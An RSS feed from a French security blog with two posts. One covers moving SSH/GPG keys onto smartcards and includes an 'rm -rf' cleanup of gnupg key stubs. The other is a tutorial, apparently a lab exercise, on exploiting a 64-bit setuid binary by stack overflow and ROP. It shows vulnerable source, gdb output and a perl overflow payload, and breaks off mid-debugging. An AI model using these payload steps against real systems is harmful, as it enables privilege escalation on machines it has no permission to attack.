<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on ngup, stfu, rtfm &amp; KISS</title>
    <link>https://unix4fun.github.io/post/index.xml</link>
    <description>Recent content in Posts on ngup, stfu, rtfm &amp; KISS</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; unix4fun 2016.&lt;br&gt;All rights reserved.</copyright>
    <lastBuildDate>Sun, 20 Nov 2016 13:05:55 +0100</lastBuildDate>
    <atom:link href="https://unix4fun.github.io/post/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>ssh gpg et ta nouvelle carte de credit</title>
      <link>https://unix4fun.github.io/post/ssh-gpg-et-ta-nouvelle-carte-de-credit/</link>
      <pubDate>Sun, 20 Nov 2016 13:05:55 +0100</pubDate>
      
      <guid>https://unix4fun.github.io/post/ssh-gpg-et-ta-nouvelle-carte-de-credit/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;Update 22/11/2016&lt;/strong&gt; : rajouts des liens sur le hardware + une section fun sur l&amp;rsquo;abus d&amp;rsquo;une fonctionnalite de l&amp;rsquo;implementation d&amp;rsquo;un HSM (heureusement qu&amp;rsquo;il est open cela dit&amp;hellip;)&lt;/p&gt;

&lt;h2 id=&#34;c-est-quoi-l-histoire&#34;&gt;C&amp;rsquo;est quoi l&amp;rsquo;histoire?&lt;/h2&gt;

&lt;p&gt;Crise de la trentaine..&lt;/p&gt;

&lt;p&gt;Comme beaucoup de bouseux/geeks de l&amp;rsquo;opensource (dont je fais partie), j&amp;rsquo;ai beaucoup de machines qui &amp;ldquo;traînent&amp;rdquo; et servent &lt;em&gt;sporadiquement&lt;/em&gt; pour certains trucs elec-digitale/FPGA/OTG/ARM/decouverte/blabla (comme le &lt;a href=&#34;https://www.crowdsupply.com/sutajio-kosagi/novena&#34;&gt;novena&lt;/a&gt;) ou certaines &amp;ldquo;tâches&amp;rdquo;/&amp;ldquo;test&amp;rdquo; (comme bientôt l&amp;rsquo;&lt;a href=&#34;https://www.crowdsupply.com/design-shift/orwl&#34;&gt;ORWL&lt;/a&gt;), j&amp;rsquo;ai plusieurs &amp;ldquo;laptops&amp;rdquo; selon que je bosse (et sur quoi) ou que je &amp;ldquo;traîne&amp;rdquo; sur mes projets persos (ah ça je traîne..) ou de l&amp;rsquo;apprentissage (&lt;a href=&#34;https://www.amazon.com/Screen-Lemote-Yeeloong-8101_B-Netbook/dp/B005XH10NQ/ref=sr_1_2?ie=UTF8&amp;amp;qid=1319989211&amp;amp;sr=8-2?tag=electronicfro-20&#34;&gt;yeelong&lt;/a&gt; pour le MIPS ou le novena pour l&amp;rsquo;arch ARM).&lt;/p&gt;

&lt;p&gt;Le truc relou c&amp;rsquo;est que je voulais pouvoir me logguer (ah mon IRC&amp;hellip;) souvent depuis la machine où je suis sur le moment (OS hétérogènes: bsd, linux, os/x) mais sans transférer/laisser trainer la/les clefs SSH et/ou GPG et en limitant (un peu, faut pas rêver non plus.) les risques qu&amp;rsquo;un putain de malware/bouseux concurrent (oui on sait jamais) me les tapent simplement&amp;hellip;&lt;/p&gt;

&lt;p&gt;Alors j&amp;rsquo;ai juste cherché, vite fait, comment je pourrais faire.. je me suis aussi demandé pourquoi je l&amp;rsquo;ai pas fait avant&amp;hellip;  je me forçais à me logguer depuis UNE seule machine trusted blablabla&amp;hellip; bref.&lt;/p&gt;

&lt;h2 id=&#34;comment&#34;&gt;Comment?&lt;/h2&gt;

&lt;p&gt;Y a pleins d&amp;rsquo;approches &amp;ldquo;potentielles&amp;rdquo;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;un disque externe/USB chiffré qui se monte automagiquement, mais c&amp;rsquo;est relou selon les FS/crypto supportés, pas multiplateforme et bon on peut encore te taper ta clef privée (genre en mémoire) meme si elle est chiffrée avec ta gentille passphrase.&lt;/li&gt;
&lt;li&gt;un HSM, une variante du FS qui te file une interface d&amp;rsquo;accès qui &amp;ldquo;devrait&amp;rdquo; marcher partout.. mais bon.. on sait ce que c&amp;rsquo;est.. driver, interface peu/pas portables/etc.. ou qui finalement se comporte comme un FS avec une interface pseudo-custom..&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://keybase.io&#34;&gt;keybase.io&lt;/a&gt; qui te propose un moyen de dealer avec tes clefs GPG (mais pas que..) de manière (IMHO) assez bordelique (mais pas que..) et complexe, mais avec une jolie CLI et une jolie interface &lt;em&gt;yoyoyo-je-suis-une-startup-à-SF-donc-jai-forcément-la-solution-to-build-a-better-world&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;smartcards (hmm?! comment ça marche?)&lt;/li&gt;
&lt;li&gt;copier-partout-et-croire-en-dieu-ou-des-esprits-que-tu-te-feras-jamais-défoncer&lt;/li&gt;
&lt;li&gt;what else? (vous pouvez commenter!)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Apres une brillante analyse (qui me caractérise bien moi, le bon et prétentieux bouseux opensourceux), la définition d&amp;rsquo;un threat model, le calcul du risque associé et la production de slides incroyables pour la prochaine conf à la con ou j&amp;rsquo;irais vomir/étaler ma mediocrite pour me vendre un peu plus en tentant de changer de statut (e.g. passer du cassoulet LIDL au cassoulet Williams Saurin, c&amp;rsquo;est une évolution en soi).&lt;/p&gt;

&lt;p&gt;J&amp;rsquo;en suis venu aux smartcards, qui loin d&amp;rsquo;être parfaites, proposent quand même un compromis &amp;ldquo;sympa&amp;rdquo; pour peu que l&amp;rsquo;on &lt;em&gt;TRUSTE&lt;/em&gt; le hardware, le protocole (CCID) et son implementation (il y a des choses intéressantes d&amp;rsquo;ailleurs.. ;)), finalement, je truste mon laptop et tous ses composants même les plus &amp;ldquo;blobesques&amp;rdquo; (hélas..) et critiques (ethernet / BIOS / etc..?!).&lt;/p&gt;

&lt;h2 id=&#34;setup&#34;&gt;Setup..&lt;/h2&gt;

&lt;p&gt;Honnêtement, je vais pas reprendre le setup pas à pas, j&amp;rsquo;ai compilé une serie de liens qui m&amp;rsquo;ont aidé à piger/faire mon setup, ca devrait largement suffire pour démarrer.&lt;/p&gt;

&lt;p&gt;Voilà les liens qui m&amp;rsquo;ont aidés:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://wiki.fsfe.org/TechDocs/CardHowtos/CardWithSubkeysUsingBackups&#34;&gt;https://wiki.fsfe.org/TechDocs/CardHowtos/CardWithSubkeysUsingBackups&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.gnupg.org/howtos/card-howto/en/smartcard-howto.html&#34;&gt;https://www.gnupg.org/howtos/card-howto/en/smartcard-howto.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://budts.be/weblog/2012/08/ssh-authentication-with-your-pgp-key&#34;&gt;https://budts.be/weblog/2012/08/ssh-authentication-with-your-pgp-key&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.sidorenko.io/blog/2014/11/04/yubikey-slash-openpgp-smartcards-for-newbies/&#34;&gt;https://www.sidorenko.io/blog/2014/11/04/yubikey-slash-openpgp-smartcards-for-newbies/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.josefsson.org/2014/06/23/offline-gnupg-master-key-and-subkeys-on-yubikey-neo-smartcard/&#34;&gt;https://blog.josefsson.org/2014/06/23/offline-gnupg-master-key-and-subkeys-on-yubikey-neo-smartcard/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.preining.info/blog/2016/04/gnupg-subkeys-yubikey/&#34;&gt;https://www.preining.info/blog/2016/04/gnupg-subkeys-yubikey/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://spin.atomicobject.com/2014/02/09/gnupg-openpgp-smartcard/&#34;&gt;https://spin.atomicobject.com/2014/02/09/gnupg-openpgp-smartcard/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://incenp.org/notes/2014/gnupg-for-ssh-authentication.html&#34;&gt;https://incenp.org/notes/2014/gnupg-for-ssh-authentication.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://openpgpcard.org/makecard/&#34;&gt;https://openpgpcard.org/makecard/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://lists.gnupg.org/pipermail/gnupg-devel/2016-January/030682.html&#34;&gt;https://lists.gnupg.org/pipermail/gnupg-devel/2016-January/030682.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.gnupg.org/documentation/manuals/gnupg/GPG-Configuration.html&#34;&gt;https://www.gnupg.org/documentation/manuals/gnupg/GPG-Configuration.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://wiki.archlinux.org/index.php/GnuPG&#34;&gt;https://wiki.archlinux.org/index.php/GnuPG&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://wiki.debian.org/Smartcards/OpenPGP#SSH&#34;&gt;https://wiki.debian.org/Smartcards/OpenPGP#SSH&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.esev.com/blog/post/2015-01-pgp-ssh-key-on-yubikey-neo/&#34;&gt;https://www.esev.com/blog/post/2015-01-pgp-ssh-key-on-yubikey-neo/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.programmierecke.net/howto/gpg-ssh.html&#34;&gt;https://www.programmierecke.net/howto/gpg-ssh.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.makomk.com/2016/01/23/openpgp-crypto-token-using-gnuk/&#34;&gt;https://www.makomk.com/2016/01/23/openpgp-crypto-token-using-gnuk/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://alexcabal.com/creating-the-perfect-gpg-keypair/&#34;&gt;https://alexcabal.com/creating-the-perfect-gpg-keypair/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En ce qui concerne les smartcards, voila ce que j&amp;rsquo;ai listé:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.yubico.com/products/yubikey-hardware/yubikey4/&#34;&gt;Yubikey v4&lt;/a&gt;, elles ont plusieurs mode de fonctionnement qui collaborent (FIDO/U2F/CCID/HSM blablabla), en gros yubikey (si vous les ouvrez) c&amp;rsquo;est 2 MCU, un &amp;ldquo;secure&amp;rdquo; MCU qui gère la crypto/storage, NXP chaisplus combien et un MCU qui gère la comm USB/CCID, &lt;a href=&#34;http://www.hexview.com/~scl/neo/&#34;&gt;quelqu&amp;rsquo;un l&amp;rsquo;avait fait avant moi&lt;/a&gt;, ça ne m&amp;rsquo;a pas empêché de l&amp;rsquo;ouvrir&amp;hellip; oui, vous avez compris j&amp;rsquo;adore ouvrir les boîtes de cassoulets mais lui au moins, il a pris/poste des photos.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.g10code.com/p-card.html&#34;&gt;OpenPGP card v2.1&lt;/a&gt; on les trouve un peu partout, un peu lentes mais marchent très bien (recommandées par la FSF).&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://shop.nitrokey.com/shop/product/nitrokey-pro-3&#34;&gt;Nitrokey&lt;/a&gt;, une implementation &amp;ldquo;opensource&amp;rdquo;/freemium d&amp;rsquo;une smartcard à base de MCU / gnuk.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.gniibe.org/pdf/fosdem-2012/gnuk-fosdem-20120204.pdf&#34;&gt;Gnuk&lt;/a&gt;, MCU avec le code opensource Gnuk, qui utilise une &lt;a href=&#34;https://github.com/jj1bdx/chopstx/blob/master/README&#34;&gt;lib de threading&lt;/a&gt; comme OS et fait tourner les opérations de crypto et la minipile USB/CCID pour repondre comme une smartcard.&lt;/li&gt;
&lt;li&gt;what else?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Hardware:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.seeedstudio.com/FST-01-with-White-Enclosure-p-1279.html&#34;&gt;https://www.seeedstudio.com/FST-01-with-White-Enclosure-p-1279.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/jj1bdx/chopstx/blob/master/README&#34;&gt;https://github.com/jj1bdx/chopstx/blob/master/README&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.fsij.org/doc-gnuk/intro.html#usages&#34;&gt;http://www.fsij.org/doc-gnuk/intro.html#usages&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/ggkitsas/gnuk&#34;&gt;https://github.com/ggkitsas/gnuk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://wiki.debian.org/Smartcards#Some_common_cards&#34;&gt;https://wiki.debian.org/Smartcards#Some_common_cards&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;les-merdes-y-a-toujours-des-merdes&#34;&gt;les merdes, y a toujours des merdes&amp;hellip;&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;keytocard&lt;/em&gt; ca MOVE (donc efface) les clefs privées de votre &lt;em&gt;keyring&lt;/em&gt; et les remplace par un &lt;em&gt;stub&lt;/em&gt;, rappelez vous en (genre avant le backup).&lt;/li&gt;
&lt;li&gt;gnupg v1 VS gnupg v2.0 VS gnupg v2.1 ça cohabite, mais pas très bien, il y a des VRAIES différences et ça peut causer quelques emmerdes, ne vous faites pas avoir. En gros démarrez avec avec 2.1.X et stick to it now&amp;hellip; c&amp;rsquo;est pas parfait mais ça évolue&amp;hellip;&lt;/li&gt;
&lt;li&gt;gnupg 2.1.15 l&amp;rsquo;avant dernière release (celle avec laquelle je me suis battu&amp;hellip;) avait un bug où la wrapper lib de threading (npth) etait utilisée AVANT d&amp;rsquo;être d&amp;rsquo;initialisée et &lt;em&gt;gpg-agent&lt;/em&gt;, &lt;em&gt;scdaemon&lt;/em&gt;, &lt;em&gt;dirmngr&lt;/em&gt; se mangeaient un bel &lt;em&gt;assert()&lt;/em&gt; et donc ne fonctionnaient pas, mais ça compilait sans soucis, du coup la release était une release&amp;hellip; mais inutilisable.. j&amp;rsquo;ai fait un patch, mais 2.1.16 a été releasé entre temps qui resoud ce BUG mais n&amp;rsquo;est pas encore forcément dans tous les repositories de packages.&lt;/li&gt;
&lt;li&gt;gnupg v2.1 crée des &lt;em&gt;stubs&lt;/em&gt; des clefs privée À CHAQUE instanciation de l&amp;rsquo;agent (&amp;ndash;card-status par exemple), si vous avez plusieurs smartcards avec la MÊME clef, oubliez pas de tuer l&amp;rsquo;agent et de &amp;ldquo;cleaner&amp;rdquo; (rm -rf $HOME/.gnupg/private-keys-v1.d/*) sinon il va associer/garder les stubs de la smartcard précédente et au moment de l utilisation vous demander d&amp;rsquo;insérer la dite smartcard.&lt;/li&gt;
&lt;li&gt;impossible d&amp;rsquo;avoir le &lt;em&gt;pinentry&lt;/em&gt; au moment de mon ssh, il me faut &amp;ldquo;préparer&amp;rdquo; l&amp;rsquo;agent, un petit &lt;em&gt;gpg2 &amp;ndash;card-status&lt;/em&gt;, suivi d&amp;rsquo;un &lt;em&gt;gpg2 -d &lt;unfichierchiffreavecmaclefGPG&gt;&lt;/em&gt; le tout avec ma carte insérée (+ le bon PIN) et juste apres je peux faire mon ssh et ça passe.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;$HOME/.gnupg/scd-events&lt;/em&gt; peut être exécuté à chaque instanciation de l&amp;rsquo;agent et/ou insertion d&amp;rsquo;une SC, attention, le lecteur SC standard USB et une yubikey ne se comportent pas de manière identique, pour avoir un comportement consistant (genre killer l&amp;rsquo;agent ou cleaner les stubs est pas évident) il faut travailler un peu..&lt;/li&gt;
&lt;li&gt;veillez comme toutes les docs le disent à BIEN FAIRE DES BACKUPS apres les différentes étapes, création masterkey, subkeys, etc.. et à mettre ces backups safe et offline, sinon tout ça ne sert à rien.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;encore-des-emmerdes&#34;&gt;Encore des emmerdes&amp;hellip;&lt;/h2&gt;

&lt;p&gt;Le probleme est toujours le meme, le &lt;em&gt;TRUST&lt;/em&gt; sur une plateforme hardware dont vous ne connaissez RIEN et ou le joli autocollant &lt;em&gt;SECURE&lt;/em&gt; est appose pour bien vous
faire sentir au chaud, je crois qu&amp;rsquo;il serait sympa d&amp;rsquo;avoir une review de plus des implementations ouvertes et peut-etre proposer des updates (soft ET hard) afin d&amp;rsquo;avoir des &amp;ldquo;smartcards&amp;rdquo; qui tiennent le coup.&lt;/p&gt;

&lt;p&gt;On nous a gentillement signale cette &amp;ldquo;attaque&amp;rdquo;, ce &amp;ldquo;post&amp;rdquo; interessant, mais c&amp;rsquo;est plutot un l&amp;rsquo;abus d&amp;rsquo;une fonctionnalite qui a mon HUMBLE avis ne devrait pas etre implementee.&lt;/p&gt;

&lt;p&gt;Ce monsieur s&amp;rsquo;est bien amuse, &lt;a href=&#34;https://raymii.org/s/articles/Nitrokey_Start_Getting_started_guide.html&#34;&gt;d&amp;rsquo;abord il joue avec son device..&lt;/a&gt;, puis il &lt;a href=&#34;https://raymii.org/s/tutorials/FST-01_firmware_upgrade_via_usb.html&#34;&gt;gratte un peu, par curiosite&lt;/a&gt;, puis &lt;a href=&#34;https://raymii.org/s/tutorials/Nitrokey_gnuk_firmware_update_via_DFU.html&#34;&gt;la encore&lt;/a&gt; plus a droite, plus a droite, un peu a gauchhhheee, laaaaaaaaaaaaaAAAAaaaa et hop &lt;a href=&#34;https://raymii.org/s/articles/Decrypt_NitroKey_HSM_or_SmartCard-HSM_private_keys.html&#34;&gt;decouvrir une belle croute de fonctionnalite&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Ca laisse reveur quand on reflechit un tout petit peu a l&amp;rsquo;utilite d&amp;rsquo;un HSM (je rappelle ce n&amp;rsquo;est pas une SmartCard CCID bla)&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Mon français sent des pieds mais ça marche, mes clefs ne sont plus &amp;ldquo;online&amp;rdquo;, à part sur mes 2 SC, la SC donne une interface pour signer/chiffrer (via CCID) mais ne permet pas de récupérer les clefs privées directement (comme sur un FS), je peux plugger ma SC sur différents systèmes (BSD, Linux, OS/x) mon auth est faisable sans pour autant compremettre aussi facilement mes clefs, je n&amp;rsquo;ai rien à copier et j&amp;rsquo;ai un élément hardware en plus de mon PIN, pour chiffrer mes datas et pour m&amp;rsquo;auth sur mes machines, plus feignant que ça tu meurs.&lt;/p&gt;

&lt;p&gt;Un seul bémol, il faut un gnupg 2.0.X ou 2.1.16+ et c&amp;rsquo;est pas encore super &amp;ldquo;smooth&amp;rdquo;, voilà en vous remerciant.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploiter un binaire 64 bits sous Linux via ROP</title>
      <link>https://unix4fun.github.io/post/howto-rop-en-64bits/</link>
      <pubDate>Mon, 03 Oct 2016 10:48:10 +0200</pubDate>
      
      <guid>https://unix4fun.github.io/post/howto-rop-en-64bits/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Bon ben dans la même veine que le post précedent, je vais tâcher d&amp;rsquo;expliquer comment exploiter un buffer overflow sur la stack, en utilisant la méthode de Return-Oriented Programming.  Cette technique est utilisée quand la stack n&amp;rsquo;est pas exécutable, l&amp;rsquo;idée étant de sauter dans une portion de code qui l&amp;rsquo;est, et petit à petit, reconstruire un flot d&amp;rsquo;exécution qui mène à&amp;hellip; obtenir un shell avec des droits plus importants, dans le cas présent.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ll
total 876
drwxr-x---  2 user-cracked  user           4096 mai   25  2015 ./
drwxr-xr-x 27 root          root           4096 sept. 26 20:01 ../
-rwsr-x---  1 user-cracked  user         877214 mai   16  2015 prog*
-rw-r-----  1 user-cracked  user            383 mai   24  2015 prog.c
-r--------  1 user-cracked  user-cracked     23 juin   7  2015 .passwd
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Comme auparavant, on a un binaire setuid user-cracked, et il nous faut lire le fichier &lt;code&gt;.passwd&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Bon, essayons d&amp;rsquo;avoir quelques informations pertinentes&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ checksec.sh --file ./prog
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ./prog

$ file prog
prog: setuid ELF 64-bit LSB  executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=41592dcab5a8baf3af0ea207b149b6153ad1e6d1, not stripped

$ cat prog.c
#inclde &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

/*
gcc -o prog prog.c -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
*/

int main(int argc, char **argv)
{

    char buffer[256];
    int len, i;

    gets(buffer);
    len = strlen(buffer);

    printf(&amp;quot;Hex result: &amp;quot;);

    for (i=0; i&amp;lt;len; i++) {
        printf(&amp;quot;%02x&amp;quot;, buffer[i]);
    }

    printf(&amp;quot;\n&amp;quot;);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bon, il y a un buffer overflow évident à cause de &lt;code&gt;gets()&lt;/code&gt;.  Tout le monde sait qu&amp;rsquo;il ne faut pas utiliser cette fonction, pas la peine d&amp;rsquo;épiloguer.&lt;/p&gt;

&lt;p&gt;Ici, il y a deux choses à avoir en tete:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;la stack est non-exécutable&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ce qui fait qu&amp;rsquo;on ne pourra pas pousser un shellcode directement dans la stack, via un buffer à exploiter ou une variable d&amp;rsquo;environnement.  Il faudra faire du ret2libc, ou du ROP.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;le programme tourne en 64 bits&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Les conventions d&amp;rsquo;appel de fonction ne sont pas les mêmes qu&amp;rsquo;en 32 bits, les syscalls ont de petites différences, etc.  On verra ca dans la suite&amp;hellip;  Il faut également garder à l&amp;rsquo;esprit que l&amp;rsquo;espace des adresses valide n&amp;rsquo;est pas le même qu&amp;rsquo;en 32 bits.  En effet souvent on utilise la fameuse séquence &lt;code&gt;0x414141..&lt;/code&gt;. pour marquer qu&amp;rsquo;on contrôle bien le pointer &lt;code&gt;$eip&lt;/code&gt;.  En 32 bits, cette adresse est valide puisque l&amp;rsquo;espace adressable va de &lt;code&gt;0X0..0&lt;/code&gt; à &lt;code&gt;0xbfffffff&lt;/code&gt;.  Par contre en 64 bits, on va de &lt;code&gt;0x00...0&lt;/code&gt; à &lt;code&gt;0x00007fffffffffff&lt;/code&gt;.  Donc &lt;code&gt;0x4141...&lt;/code&gt; va directement taper dans les adresses interdites.  Si on forge une adresse bidon, il faut mettre les deux premiers bytes (au moins) à zéro.&lt;/p&gt;

&lt;p&gt;Cherchons la présence de fonctions qui nous aideraient bien à avoir un shell&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ nm -a ./prog | egrep &#39;(system|exec)&#39;
0000000000468420 T _dl_make_stack_executable
00000000006c11a8 D _dl_make_stack_executable_hook
000000000048ce60 t execute_cfa_program
000000000048e200 t execute_stack_op
00000000004aa1c0 r system_dirs
00000000004aa1a0 r system_dirs_len
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oookay, rien d&amp;rsquo;intéressant&amp;hellip;   Vraiment?&lt;/p&gt;

&lt;h2 id=&#34;tentative-de-ret2libc&#34;&gt;Tentative de ret2libc&lt;/h2&gt;

&lt;p&gt;Il y a peut-être moyen de rendre la stack exécutable grâce à &lt;code&gt;mprotect()&lt;/code&gt; (&lt;code&gt;_dl_make_stack_executable&lt;/code&gt; nous y a fait fortement penser), puis de sauter à l&amp;rsquo;adresse d&amp;rsquo;un shellcode qu&amp;rsquo;on aurait mis dans le buffer du programme, ou dans une variable d&amp;rsquo;environnement.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ nm prog| grep mprotect
0000000000434e10 W mprotect
0000000000434e10 T __mprotect
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ca semble jouable? Le man de &lt;code&gt;mprotect(2)&lt;/code&gt; nous dit qu&amp;rsquo;il faut PROT_EXEC pour rendre une portion de code exécutable (&lt;code&gt;0x4&lt;/code&gt; d&amp;rsquo;après les headers du système).  Dans le doute, si on peut faire appel à cette fonction, autant filer tous les flags de l&amp;rsquo;univers: &lt;code&gt;PROT_EXEC|PROT_WRITE|PROT_READ&lt;/code&gt; = &lt;code&gt;0x7&lt;/code&gt;.  Le prototype de la fonction est le suivant :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   int mprotect(void *addr, size_t len, int prot);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Il faudra donc mettre dans l&amp;rsquo;ordre, sur la stack:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;adresses basses [ @__mprotect | return addr | 0x7 | stacksize | $esp ] adresses hautes
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Euh&amp;hellip; en fait non.  Deux choses:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Pour une fonction qui n&amp;rsquo;est pas un &lt;code&gt;syscall&lt;/code&gt;, sur x86-32 les paramètres sont passés sur la stack.  Alors que sur x86-64 on passe par les registres, donc la stack sera de la forme:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;adresses basses [ @__mprotect | return addr ] adresses hautes
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Pour un &lt;code&gt;syscall&lt;/code&gt; dans le deux cas on passe par les registres&amp;hellip; mais ce ne sont pas les mêmes.  Sur x86-64 les paramètres sont passés par les registres &lt;code&gt;$rdi&lt;/code&gt;, &lt;code&gt;$rsi&lt;/code&gt;, &lt;code&gt;$rdx&lt;/code&gt;, &lt;code&gt;$rcx&lt;/code&gt;, &lt;code&gt;$r8&lt;/code&gt;, et &lt;code&gt;$r9&lt;/code&gt;.  Si vraiment il faut encore passer plus de paramètres à la fonction, alors c&amp;rsquo;est mis sur la stack (mais ça reste rare).  Mais on ne devrait pas aller jusque là, puisque &lt;code&gt;mprotect()&lt;/code&gt; ne prend que 3 arguments.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Une fois la stack rendue exécutable, il suffira d&amp;rsquo;avoir empilé l&amp;rsquo;adresse de notre shellcode (&lt;code&gt;return addr&lt;/code&gt; dans le petit schéma) pour sauter où on souhaite.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gdb$ ./prog
[...]
gdb$ disas main
Dump of assembler code for function main:
   0x000000000040105e &amp;lt;+0&amp;gt;:     push   rbp
   0x000000000040105f &amp;lt;+1&amp;gt;:     mov    rbp,rsp
   0x0000000000401062 &amp;lt;+4&amp;gt;:     sub    rsp,0x120
   [...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On voit que le système réserve &lt;code&gt;0x120&lt;/code&gt; (288) bytes dans la stack pour faire de la place aux variables locales, etc.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   0x0000000000401076 &amp;lt;+24&amp;gt;:    lea    rax,[rbp-0x110]
   0x000000000040107d &amp;lt;+31&amp;gt;:    mov    rdi,rax
   0x0000000000401080 &amp;lt;+34&amp;gt;:    call   0x408750 &amp;lt;gets&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A l&amp;rsquo;aide de ces trois instructions, on déduit que le registre &lt;code&gt;$rax&lt;/code&gt; contient l&amp;rsquo;adresse du buffer qui sera passé à la fonction &lt;code&gt;gets()&lt;/code&gt;.  Et que sa base est à &lt;code&gt;0x110&lt;/code&gt; (272) bytes du début de la stack (&lt;code&gt;$rbp&lt;/code&gt;).  On en déduit donc que si on écrit 272 bytes dans &lt;code&gt;buffer&lt;/code&gt;, alors on arrivera stack a la limite de &lt;code&gt;$rbp&lt;/code&gt; qui a été empilé.  Les 8 prochains bytes vont écraser $rbp, et les 8 suivant écraseront &lt;code&gt;$rip&lt;/code&gt;.  C&amp;rsquo;est ce registre qu&amp;rsquo;on veut contrôler.  On va tester (par acquis de conscience on met une adresse valide dans &lt;code&gt;$rbp&lt;/code&gt;, i.e. &lt;code&gt;0x0000424242424242&lt;/code&gt;, et &lt;code&gt;0x0000434343434343&lt;/code&gt; dans &lt;code&gt;$rip&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gdb$ r &amp;lt; &amp;lt;(perl -e &#39;print &amp;quot;A&amp;quot;x272 . &amp;quot;B&amp;quot;x6 . &amp;quot;\x00\x00&amp;quot; . &amp;quot;C&amp;quot;x6 . &amp;quot;\x00\x00&amp;quot;&#39;)
----------------------------------------------------------------------------------------------------------------------[regs]
 RAX: 0x0000000000000000  RBX: 0x00000000004002B0  RBP: 0x0000424242424242  RSP: 0x000003D42322B720  o d I t s Z a P c
 RDI: 0x0000000000000001  RSI: 0x00000000006C26C0  RDX: 0x000000000000000A  RCX: 0x0000000000434310  RIP: 0x0000434343434343
